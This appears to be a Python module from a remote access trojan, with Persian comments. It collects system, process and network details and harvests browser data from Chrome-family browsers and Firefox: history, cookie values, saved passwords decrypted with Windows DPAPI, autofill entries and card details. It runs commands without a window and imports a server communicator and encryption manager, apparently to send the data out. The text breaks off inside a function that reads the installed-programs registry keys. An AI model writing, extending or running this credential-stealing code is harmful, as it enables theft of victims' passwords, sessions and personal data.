import os
import platform
import psutil
import socket
import json
import time
import logging
import subprocess
import getpass
import sqlite3
import winreg
import shutil
import tempfile
from datetime import datetime, timedelta
import datetime as dt  # اضافه کردن این خط
from typing import Dict, List, Optional, Any

from rat_config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator, CommunicationError
from system.browser_detector import BrowserDetector

class SystemCollector:
    def __init__(self):
        self.logger = logging.getLogger("SystemCollector")
        self.client_id = Config.get_client_id()
        self.encryption_manager = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption_manager)
        self.browser_detector = BrowserDetector()
        
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "client_id": self.client_id,
            "browser_data": {},
            "detection_summary": {},
            "collection_stats": {},
            "system_info": {},
            "installed_programs": [],
            "running_processes": [],
            "network_info": {}
        }

    def _run_command(self, cmd: list, timeout: int = 30) -> dict:
        """اجرای دستور با مدیریت خطا"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {"status": "success", "stdout": result.stdout, "stderr": result.stderr}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "stdout": e.stdout, "stderr": e.stderr}
        except Exception as e:
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def collect_system_info(self):
        """جمع‌آوری اطلاعات سیستم"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("System info collection disabled")
            return {"message": "System info collection disabled"}

        self.logger.info("Collecting system information...")
        try:
            system_info = {
                "os_name": platform.system(),
                "os_version": platform.version(),
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "ram_total_mb": round(psutil.virtual_memory().total / (1024 * 1024), 2),
                "ram_available_mb": round(psutil.virtual_memory().available / (1024 * 1024), 2),
                "cpu_cores": psutil.cpu_count(),
                "cpu_usage": psutil.cpu_percent(interval=1),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat()
            }
            
            # جمع‌آوری اطلاعات دیسک
            try:
                disk_usage = psutil.disk_usage('/')
                system_info.update({
                    "disk_total_gb": round(disk_usage.total / (1024**3), 2),
                    "disk_used_gb": round(disk_usage.used / (1024**3), 2),
                    "disk_free_gb": round(disk_usage.free / (1024**3), 2)
                })
            except Exception as e:
                system_info["disk_error"] = str(e)

            # اطلاعات اضافی سیستم
            try:
                system_info["cpu_frequency"] = psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {}
                system_info["load_average"] = os.getloadavg() if hasattr(os, 'getloadavg') else "N/A"
            except Exception as e:
                system_info["additional_info_error"] = str(e)

            self.results["system_info"] = system_info
            self.logger.info("System information collected successfully")
            return system_info

        except Exception as e:
            error_msg = f"Failed to collect system info: {str(e)}"
            self.results["system_info"]["error"] = error_msg
            self.logger.error(error_msg)
            return {"error": error_msg}

    def collect_running_processes(self):
        """جمع‌آوری لیست فرآیندهای در حال اجرا"""
        if not Config.COLLECT_RUNNING_PROCESSES:
            self.logger.info("Running processes collection disabled")
            return []

        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent', 'create_time']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'username': proc.info['username'],
                        'memory_mb': round(proc.info['memory_info'].rss / (1024 * 1024), 2),
                        'cpu_percent': proc.info['cpu_percent'],
                        'create_time': datetime.fromtimestamp(proc.info['create_time']).isoformat() if proc.info['create_time'] else None
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            # مرتب‌سازی بر اساس مصرف memory
            processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            self.results["running_processes"] = processes[:50]  # فقط 50 فرآیند اول
            self.logger.info(f"Collected {len(processes)} running processes")
            return processes[:50]
        except Exception as e:
            self.logger.error(f"Failed to collect running processes: {str(e)}")
            return []

    def collect_network_info(self):
        """جمع‌آوری اطلاعات شبکه"""
        if not Config.COLLECT_NETWORK_INFO:
            self.logger.info("Network info collection disabled")
            return {}

        try:
            network_info = {
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "network_interfaces": []
            }

            # اطلاعات interfaceهای شبکه
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {
                    "interface": interface,
                    "addresses": []
                }
                for addr in addrs:
                    interface_info["addresses"].append({
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })
                network_info["network_interfaces"].append(interface_info)

            # اتصالات شبکه
            try:
                connections = []
                for conn in psutil.net_connections(kind='inet'):
                    try:
                        connections.append({
                            "fd": conn.fd,
                            "family": str(conn.family),
                            "type": str(conn.type),
                            "laddr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                            "raddr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                            "status": conn.status
                        })
                    except:
                        continue
                network_info["connections"] = connections[:100]  # محدود کردن تعداد
            except:
                network_info["connections_error"] = "Unable to get network connections"

            self.results["network_info"] = network_info
            self.logger.info("Network information collected successfully")
            return network_info

        except Exception as e:
            self.logger.error(f"Failed to collect network info: {str(e)}")
            return {"error": str(e)}

    def collect_comprehensive_browser_data(self):
        """جمع‌آوری اطلاعات کامل مرورگر با تشخیص خودکار"""
        if not Config.ENABLE_BROWSER_DATA_COLLECTION:
            self.logger.info("Browser data collection disabled")
            return {
                "status": "disabled",
                "message": "Browser data collection disabled",
                "timestamp": datetime.now().isoformat()  # اصلاح شده
            }


        self.logger.info("🚀 Starting comprehensive browser data collection with auto-detection...")
        
        try:
            # مرحله 1: تشخیص مرورگرها
            self.logger.info("🔍 Phase 1: Detecting installed browsers...")
            detected_browsers = self.browser_detector.detect_installed_browsers()
            self.results["detection_summary"] = self.browser_detector.get_detection_summary()
            
            browser_data = {}
            collection_stats = {
                "total_browsers": len(detected_browsers),
                "successful_collections": 0,
                "failed_collections": 0,
                "details": {}
            }

            # مرحله 2: جمع‌آوری داده از هر مرورگر
            for browser_name, browser_info in detected_browsers.items():
                self.logger.info(f"📊 Phase 2: Collecting data from {browser_name}...")
                try:
                    browser_result = self._collect_browser_data_advanced(browser_name, browser_info)
                    if browser_result and not browser_result.get("error"):
                        browser_data[browser_name.lower()] = browser_result
                        collection_stats["successful_collections"] += 1
                        collection_stats["details"][browser_name] = "success"
                        self.logger.info(f"✅ Successfully collected data from {browser_name}")
                    else:
                        collection_stats["failed_collections"] += 1
                        error_msg = browser_result.get("error", "unknown error")
                        collection_stats["details"][browser_name] = error_msg
                        self.logger.warning(f"❌ Failed to collect data from {browser_name}: {error_msg}")
                except Exception as e:
                    collection_stats["failed_collections"] += 1
                    collection_stats["details"][browser_name] = str(e)
                    self.logger.error(f"💥 Error collecting data from {browser_name}: {str(e)}")

            # مرحله 3: ذخیره نتایج
            self.results["browser_data"] = browser_data
            self.results["collection_stats"] = collection_stats
            
            self.logger.info(f"🎉 Comprehensive browser data collection completed. "
                           f"Success: {collection_stats['successful_collections']}, "
                           f"Failed: {collection_stats['failed_collections']}")

            return {
                "status": "success",
                "message": "Comprehensive browser data collected successfully",
                "data": browser_data,
                "stats": collection_stats,
                "detection_summary": self.results["detection_summary"],
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            error_msg = f"Comprehensive browser data collection failed: {str(e)}"
            self.logger.error(f"💥 {error_msg}")
            return {
                "status": "error",
                "message": error_msg,
                "timestamp": datetime.now().isoformat()
            }

    def _collect_browser_data_advanced(self, browser_name: str, browser_info: Dict):
        """جمع‌آوری پیشرفته داده‌های مرورگر"""
        self.logger.info(f"🔄 Starting advanced data collection for {browser_name}")
        
        try:
            browser_data = {
                "browser_info": browser_info,
                "collection_timestamp": datetime.now().isoformat(),
                "data": {}
            }

            if browser_name == "Chrome":
                browser_data["data"] = self._get_chrome_data_advanced(browser_info)
            elif browser_name == "Firefox":
                browser_data["data"] = self._get_firefox_data_advanced(browser_info)
            elif browser_name == "Edge":
                browser_data["data"] = self._get_edge_data_advanced(browser_info)
            elif browser_name == "Brave":
                browser_data["data"] = self._get_brave_data_advanced(browser_info)
            elif browser_name == "Opera":
                browser_data["data"] = self._get_opera_data_advanced(browser_info)
            else:
                browser_data["data"] = {"error": f"Unsupported browser: {browser_name}"}

            return browser_data

        except Exception as e:
            self.logger.error(f"💥 Advanced data collection failed for {browser_name}: {str(e)}")
            return {"error": f"Collection failed: {str(e)}"}

    def _get_chrome_data_advanced(self, browser_info: Dict):
        """جمع‌آوری پیشرفته داده‌های Chrome"""
        self.logger.info("🪟 Collecting advanced Chrome data...")
        chrome_data = {}
        
        try:
            # پیدا کردن پروفایل اصلی
            main_profile = self._find_main_profile(browser_info, "Chrome")
            if not main_profile:
                return {"error": "No Chrome profile found"}

            profile_path = main_profile["path"]
            self.logger.info(f"📁 Using Chrome profile: {profile_path}")

            # جمع‌آوری تاریخچه با جزئیات بیشتر
            if Config.COLLECT_HISTORY:
                chrome_data["history"] = self._get_chrome_history_detailed(profile_path)
                self.logger.info(f"📜 Collected {len(chrome_data['history'])} history entries")

            # جمع‌آوری کوکی‌ها
            if Config.COLLECT_COOKIES:
                chrome_data["cookies"] = self._get_chrome_cookies_detailed(profile_path)
                self.logger.info(f"🍪 Collected {len(chrome_data['cookies'])} cookies")

            # جمع‌آوری بوکمارک‌ها
            chrome_data["bookmarks"] = self._get_chrome_bookmarks_detailed(profile_path)
            self.logger.info(f"🔖 Collected {len(chrome_data['bookmarks'])} bookmarks")

            # جمع‌آوری پسوردها (در صورت فعال بودن)
            if Config.COLLECT_PASSWORDS:
                chrome_data["passwords"] = self._get_chrome_passwords_advanced(profile_path)
                self.logger.info(f"🔑 Collected {len(chrome_data['passwords'])} passwords")

            # جمع‌آوری اطلاعات autofill
            chrome_data["autofill"] = self._get_chrome_autofill_detailed(profile_path)
            self.logger.info(f"📝 Collected {len(chrome_data['autofill'])} autofill entries")

            # جمع‌آوری اطلاعات credit cards
            chrome_data["credit_cards"] = self._get_chrome_credit_cards_detailed(profile_path)
            self.logger.info(f"💳 Collected {len(chrome_data['credit_cards'])} credit cards")

            # جمع‌آوری دانلودها
            chrome_data["downloads"] = self._get_chrome_downloads(profile_path)
            self.logger.info(f"📥 Collected {len(chrome_data['downloads'])} downloads")

            # جمع‌آوری extensions
            chrome_data["extensions"] = self._get_chrome_extensions(profile_path)
            self.logger.info(f"🧩 Collected {len(chrome_data['extensions'])} extensions")

            return chrome_data

        except Exception as e:
            self.logger.error(f"💥 Advanced Chrome data collection failed: {str(e)}")
            return {"error": f"Chrome collection failed: {str(e)}"}

    def _get_chrome_history_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری تاریخچه Chrome با جزئیات کامل"""
        history = []
        
        try:
            history_db = os.path.join(profile_path, "History")
            if not os.path.exists(history_db):
                self.logger.warning("Chrome history database not found")
                return []

            temp_db = self._create_temp_copy(history_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                # کوئری پیشرفته برای تاریخچه
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        u.url, 
                        u.title, 
                        u.visit_count, 
                        u.typed_count,
                        u.last_visit_time,
                        v.visit_time,
                        v.from_visit,
                        v.transition
                    FROM urls u
                    LEFT JOIN visits v ON u.id = v.url
                    ORDER BY u.last_visit_time DESC
                    LIMIT 1000
                """)
                
                for row in cursor.fetchall():
                    visit_time = self._chrome_time_to_datetime(row['last_visit_time'])
                    history.append({
                        "url": row['url'],
                        "title": row['title'] or "No Title",
                        "visit_count": row['visit_count'],
                        "typed_count": row['typed_count'],
                        "last_visit_time": visit_time.isoformat() if visit_time else None,
                        "transition_type": row['transition']
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Chrome history: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Chrome history collection error: {str(e)}")
            
        return history

    def _get_chrome_cookies_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری کوکی‌های Chrome با جزئیات کامل"""
        cookies = []
        
        try:
            cookies_db = os.path.join(profile_path, "Cookies")
            if not os.path.exists(cookies_db):
                self.logger.warning("Chrome cookies database not found")
                return []

            temp_db = self._create_temp_copy(cookies_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        host_key, 
                        name, 
                        value,
                        path,
                        expires_utc,
                        is_secure,
                        is_httponly,
                        creation_utc,
                        last_access_utc,
                        has_expires,
                        is_persistent
                    FROM cookies 
                    ORDER BY creation_utc DESC
                    LIMIT 2000
                """)
                
                for row in cursor.fetchall():
                    cookies.append({
                        "domain": row['host_key'],
                        "name": row['name'],
                        "value": row['value'],
                        "path": row['path'],
                        "expires": self._chrome_time_to_datetime(row['expires_utc']).isoformat() if row['expires_utc'] else None,
                        "secure": bool(row['is_secure']),
                        "httponly": bool(row['is_httponly']),
                        "created": self._chrome_time_to_datetime(row['creation_utc']).isoformat() if row['creation_utc'] else None,
                        "last_accessed": self._chrome_time_to_datetime(row['last_access_utc']).isoformat() if row['last_access_utc'] else None,
                        "persistent": bool(row['is_persistent'])
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Chrome cookies: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Chrome cookies collection error: {str(e)}")
            
        return cookies

    def _get_chrome_bookmarks_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری بوکمارک‌های Chrome"""
        bookmarks = []
        
        try:
            bookmarks_file = os.path.join(profile_path, "Bookmarks")
            if not os.path.exists(bookmarks_file):
                self.logger.warning("Chrome bookmarks file not found")
                return []

            with open(bookmarks_file, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
            
            def extract_bookmarks(node, folder_path=""):
                if 'children' in node:
                    current_folder = folder_path + "/" + node.get('name', 'Unnamed')
                    for child in node['children']:
                        extract_bookmarks(child, current_folder)
                elif node.get('type') == 'url':
                    bookmarks.append({
                        "name": node.get('name', ''),
                        "url": node.get('url', ''),
                        "date_added": node.get('date_added', ''),
                        "folder": folder_path
                    })
            
            if 'roots' in bookmarks_data:
                for root_name, root_data in bookmarks_data['roots'].items():
                    if root_data:
                        extract_bookmarks(root_data, f"/{root_name}")
            
        except Exception as e:
            self.logger.error(f"Chrome bookmarks collection error: {str(e)}")
            
        return bookmarks

    def _get_chrome_passwords_advanced(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری پیشرفته پسوردهای Chrome"""
        passwords = []
        
        try:
            login_db = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db):
                self.logger.warning("Chrome login database not found")
                return []

            temp_db = self._create_temp_copy(login_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        origin_url,
                        action_url,
                        username_value,
                        password_value,
                        date_created,
                        date_last_used,
                        date_password_modified,
                        times_used
                    FROM logins
                    ORDER BY date_created DESC
                    LIMIT 500
                """)
                
                for row in cursor.fetchall():
                    # تلاش برای دکریپت کردن پسورد
                    decrypted_password = self._decrypt_chrome_password(row['password_value'])
                    
                    passwords.append({
                        "url": row['origin_url'],
                        "action_url": row['action_url'],
                        "username": row['username_value'],
                        "password": decrypted_password,
                        "date_created": self._chrome_time_to_datetime(row['date_created']).isoformat() if row['date_created'] else None,
                        "date_last_used": self._chrome_time_to_datetime(row['date_last_used']).isoformat() if row['date_last_used'] else None,
                        "times_used": row['times_used']
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Chrome passwords: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Chrome passwords collection error: {str(e)}")
            
        return passwords

    def _decrypt_chrome_password(self, encrypted_password: bytes) -> str:
        """دکریپت کردن پسورد Chrome"""
        try:
            if not encrypted_password:
                return ""
                
            # اگر پسورد خالی یا null باشد
            if len(encrypted_password) == 0:
                return ""
                
            # اگر پسورد از قبل متن ساده باشد
            try:
                return encrypted_password.decode('utf-8')
            except:
                pass
                
            # در ویندوز، پسوردهای Chrome با DPAPI رمزنگاری شده‌اند
            # این بخش نیاز به پیاده‌سازی با win32crypt دارد
            try:
                import win32crypt
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                return decrypted[1].decode('utf-8')
            except ImportError:
                self.logger.warning("win32crypt not available for password decryption")
            except Exception as e:
                self.logger.warning(f"Password decryption failed: {str(e)}")
                
            return "ENCRYPTED_PASSWORD_NEEDS_DECRYPTION"
            
        except Exception as e:
            self.logger.error(f"Password decryption error: {str(e)}")
            return "DECRYPTION_ERROR"

    def _get_chrome_autofill_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری اطلاعات autofill Chrome"""
        autofill_data = []
        
        try:
            web_data_db = os.path.join(profile_path, "Web Data")
            if not os.path.exists(web_data_db):
                self.logger.warning("Chrome web data database not found")
                return []

            temp_db = self._create_temp_copy(web_data_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        name, 
                        value, 
                        value_lower, 
                        date_created, 
                        date_last_used,
                        count
                    FROM autofill 
                    ORDER BY date_last_used DESC 
                    LIMIT 500
                """)
                
                for row in cursor.fetchall():
                    autofill_data.append({
                        "name": row['name'],
                        "value": row['value'],
                        "date_created": self._chrome_time_to_datetime(row['date_created']).isoformat() if row['date_created'] else None,
                        "date_last_used": self._chrome_time_to_datetime(row['date_last_used']).isoformat() if row['date_last_used'] else None,
                        "usage_count": row['count']
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Chrome autofill: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Chrome autofill collection error: {str(e)}")
            
        return autofill_data

    def _get_chrome_credit_cards_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری اطلاعات کارت‌های اعتباری Chrome"""
        credit_cards = []
        
        try:
            web_data_db = os.path.join(profile_path, "Web Data")
            if not os.path.exists(web_data_db):
                return []

            temp_db = self._create_temp_copy(web_data_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        name_on_card,
                        expiration_month,
                        expiration_year,
                        card_number_encrypted,
                        date_modified
                    FROM credit_cards 
                    ORDER BY date_modified DESC
                    LIMIT 100
                """)
                
                for row in cursor.fetchall():
                    credit_cards.append({
                        "name": row['name_on_card'],
                        "exp_month": row['expiration_month'],
                        "exp_year": row['expiration_year'],
                        "number": "Encrypted",  # نیاز به دکریپت پیشرفته دارد
                        "last_modified": self._chrome_time_to_datetime(row['date_modified']).isoformat() if row['date_modified'] else None
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Chrome credit cards: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Chrome credit cards collection error: {str(e)}")
            
        return credit_cards

    def _get_chrome_downloads(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری اطلاعات دانلودهای Chrome"""
        downloads = []
        
        try:
            history_db = os.path.join(profile_path, "History")
            if not os.path.exists(history_db):
                return []

            temp_db = self._create_temp_copy(history_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        target_path,
                        tab_url,
                        tab_referrer_url,
                        start_time,
                        end_time,
                        received_bytes,
                        total_bytes,
                        state
                    FROM downloads
                    ORDER BY start_time DESC
                    LIMIT 200
                """)
                
                for row in cursor.fetchall():
                    downloads.append({
                        "filename": os.path.basename(row['target_path']),
                        "path": row['target_path'],
                        "url": row['tab_url'],
                        "referrer": row['tab_referrer_url'],
                        "start_time": self._chrome_time_to_datetime(row['start_time']).isoformat() if row['start_time'] else None,
                        "end_time": self._chrome_time_to_datetime(row['end_time']).isoformat() if row['end_time'] else None,
                        "received_bytes": row['received_bytes'],
                        "total_bytes": row['total_bytes'],
                        "state": row['state']
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Chrome downloads: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Chrome downloads collection error: {str(e)}")
            
        return downloads

    def _get_chrome_extensions(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری اطلاعات extensions Chrome"""
        extensions = []
        
        try:
            extensions_dir = os.path.join(profile_path, "Extensions")
            if not os.path.exists(extensions_dir):
                return []

            # پیدا کردن فایل‌های manifest.json در پوشه extensions
            for ext_folder in os.listdir(extensions_dir):
                ext_path = os.path.join(extensions_dir, ext_folder)
                if os.path.isdir(ext_path):
                    for version_folder in os.listdir(ext_path):
                        version_path = os.path.join(ext_path, version_folder)
                        manifest_file = os.path.join(version_path, "manifest.json")
                        
                        if os.path.exists(manifest_file):
                            try:
                                with open(manifest_file, 'r', encoding='utf-8') as f:
                                    manifest_data = json.load(f)
                                
                                extensions.append({
                                    "id": ext_folder,
                                    "version": version_folder,
                                    "name": manifest_data.get("name", ""),
                                    "description": manifest_data.get("description", ""),
                                    "version_name": manifest_data.get("version", ""),
                                    "permissions": manifest_data.get("permissions", [])
                                })
                            except Exception as e:
                                self.logger.warning(f"Error reading extension manifest: {str(e)}")
            
        except Exception as e:
            self.logger.error(f"Chrome extensions collection error: {str(e)}")
            
        return extensions

    def _chrome_time_to_datetime(self, chrome_time: int) -> Optional[datetime]:
        """تبدیل زمان Chrome به datetime"""
        try:
            if not chrome_time:
                return None
            # زمان Chrome از 1 ژانویه 1601 شروع می‌شود
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
        except Exception as e:
            self.logger.warning(f"Error converting Chrome time: {str(e)}")
            return None

    def _create_temp_copy(self, source_path: str) -> str:
        """ایجاد کپی موقت از فایل دیتابیس"""
        try:
            temp_dir = tempfile.gettempdir()
            temp_filename = f"temp_{os.path.basename(source_path)}_{int(time.time())}"
            temp_path = os.path.join(temp_dir, temp_filename)
            
            shutil.copy2(source_path, temp_path)
            self.logger.debug(f"Created temp copy: {temp_path}")
            return temp_path
        except Exception as e:
            self.logger.error(f"Error creating temp copy: {str(e)}")
            raise

    def _cleanup_temp_file(self, temp_path: str):
        """پاک کردن فایل موقت"""
        try:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                self.logger.debug(f"Cleaned up temp file: {temp_path}")
        except Exception as e:
            self.logger.warning(f"Error cleaning up temp file: {str(e)}")

    def _find_main_profile(self, browser_info: Dict, browser_name: str) -> Optional[Dict]:
        """پیدا کردن پروفایل اصلی مرورگر"""
        try:
            profiles = browser_info.get("profiles", [])
            if not profiles:
                self.logger.warning(f"No profiles found for {browser_name}")
                return None
                
            # اولویت با پروفایل Default
            for profile in profiles:
                if profile.get("name") == "Default":
                    self.logger.info(f"Found default profile for {browser_name}")
                    return profile
                    
            # اگر Default پیدا نشد، اولین پروفایل
            self.logger.info(f"Using first available profile for {browser_name}")
            return profiles[0]
            
        except Exception as e:
            self.logger.error(f"Error finding main profile for {browser_name}: {str(e)}")
            return None

    def _get_firefox_data_advanced(self, browser_info: Dict):
        """جمع‌آوری داده‌های Firefox"""
        self.logger.info("🦊 Collecting Firefox data...")
        firefox_data = {}
        
        try:
            main_profile = self._find_main_profile(browser_info, "Firefox")
            if not main_profile:
                return {"error": "No Firefox profile found"}

            profile_path = main_profile["path"]
            self.logger.info(f"📁 Using Firefox profile: {profile_path}")

            # جمع‌آوری تاریخچه Firefox
            if Config.COLLECT_HISTORY:
                firefox_data["history"] = self._get_firefox_history_detailed(profile_path)
                self.logger.info(f"📜 Collected {len(firefox_data['history'])} Firefox history entries")

            # جمع‌آوری کوکی‌های Firefox
            if Config.COLLECT_COOKIES:
                firefox_data["cookies"] = self._get_firefox_cookies_detailed(profile_path)
                self.logger.info(f"🍪 Collected {len(firefox_data['cookies'])} Firefox cookies")

            # جمع‌آوری بوکمارک‌های Firefox
            firefox_data["bookmarks"] = self._get_firefox_bookmarks_detailed(profile_path)
            self.logger.info(f"🔖 Collected {len(firefox_data['bookmarks'])} Firefox bookmarks")

            return firefox_data

        except Exception as e:
            self.logger.error(f"💥 Advanced Firefox data collection failed: {str(e)}")
            return {"error": f"Firefox collection failed: {str(e)}"}

    def _get_firefox_history_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری تاریخچه Firefox"""
        history = []
        
        try:
            places_db = os.path.join(profile_path, "places.sqlite")
            if not os.path.exists(places_db):
                return []

            temp_db = self._create_temp_copy(places_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        p.url, 
                        p.title, 
                        v.visit_date,
                        p.visit_count
                    FROM moz_places p
                    JOIN moz_historyvisits v ON p.id = v.place_id
                    ORDER BY v.visit_date DESC
                    LIMIT 1000
                """)
                
                for row in cursor.fetchall():
                    # زمان Firefox بر اساس microseconds از epoch
                    visit_time = datetime.fromtimestamp(row['visit_date'] / 1000000) if row['visit_date'] else None
                    history.append({
                        "url": row['url'],
                        "title": row['title'] or "No Title",
                        "visit_time": visit_time.isoformat() if visit_time else None,
                        "visit_count": row['visit_count']
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Firefox history: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Firefox history collection error: {str(e)}")
            
        return history

    def _get_firefox_cookies_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری کوکی‌های Firefox"""
        cookies = []
        
        try:
            cookies_db = os.path.join(profile_path, "cookies.sqlite")
            if not os.path.exists(cookies_db):
                return []

            temp_db = self._create_temp_copy(cookies_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        host, 
                        name, 
                        value,
                        path,
                        expiry,
                        isSecure,
                        isHttpOnly,
                        creationTime,
                        lastAccessed
                    FROM moz_cookies 
                    ORDER BY creationTime DESC
                    LIMIT 2000
                """)
                
                for row in cursor.fetchall():
                    # زمان Firefox بر اساس microseconds از epoch
                    creation_time = datetime.fromtimestamp(row['creationTime'] / 1000000) if row['creationTime'] else None
                    last_accessed = datetime.fromtimestamp(row['lastAccessed'] / 1000000) if row['lastAccessed'] else None
                    
                    cookies.append({
                        "domain": row['host'],
                        "name": row['name'],
                        "value": row['value'],
                        "path": row['path'],
                        "expires": datetime.fromtimestamp(row['expiry']).isoformat() if row['expiry'] else None,
                        "secure": bool(row['isSecure']),
                        "httponly": bool(row['isHttpOnly']),
                        "created": creation_time.isoformat() if creation_time else None,
                        "last_accessed": last_accessed.isoformat() if last_accessed else None
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Firefox cookies: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Firefox cookies collection error: {str(e)}")
            
        return cookies

    def _get_firefox_bookmarks_detailed(self, profile_path: str) -> List[Dict]:
        """جمع‌آوری بوکمارک‌های Firefox"""
        bookmarks = []
        
        try:
            places_db = os.path.join(profile_path, "places.sqlite")
            if not os.path.exists(places_db):
                return []

            temp_db = self._create_temp_copy(places_db)
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT 
                        p.url, 
                        b.title,
                        p.dateAdded
                    FROM moz_bookmarks b
                    JOIN moz_places p ON b.fk = p.id
                    WHERE b.type = 1
                    ORDER BY b.dateAdded DESC
                    LIMIT 500
                """)
                
                for row in cursor.fetchall():
                    date_added = datetime.fromtimestamp(row['dateAdded'] / 1000000) if row['dateAdded'] else None
                    bookmarks.append({
                        "title": row['title'] or "No Title",
                        "url": row['url'],
                        "date_added": date_added.isoformat() if date_added else None
                    })
                    
            except Exception as e:
                self.logger.error(f"Error querying Firefox bookmarks: {str(e)}")
            finally:
                conn.close()
                self._cleanup_temp_file(temp_db)
                
        except Exception as e:
            self.logger.error(f"Firefox bookmarks collection error: {str(e)}")
            
        return bookmarks

    def _get_edge_data_advanced(self, browser_info: Dict):
        """جمع‌آوری داده‌های Edge"""
        self.logger.info("🌐 Collecting Edge data...")
        # Edge از موتور Chromium استفاده می‌کند، بنابراین مشابه Chrome است
        return self._get_chrome_data_advanced(browser_info)

    def _get_brave_data_advanced(self, browser_info: Dict):
        """جمع‌آوری داده‌های Brave"""
        self.logger.info("🦁 Collecting Brave data...")
        # Brave نیز از موتور Chromium استفاده می‌کند
        return self._get_chrome_data_advanced(browser_info)

    def _get_opera_data_advanced(self, browser_info: Dict):
        """جمع‌آوری داده‌های Opera"""
        self.logger.info("🎭 Collecting Opera data...")
        # Opera نیز از موتور Chromium استفاده می‌کند
        return self._get_chrome_data_advanced(browser_info)

    def collect_installed_programs(self):
        """جمع‌آوری برنامه‌های نصب شده"""
        if not Config.COLLECT_INSTALLED_PROGRAMS:
            self.logger.info("Installed programs collection disabled")
            return []

        self.logger.info("Collecting installed programs...")
        try:
            programs = []
            reg_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for reg_path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
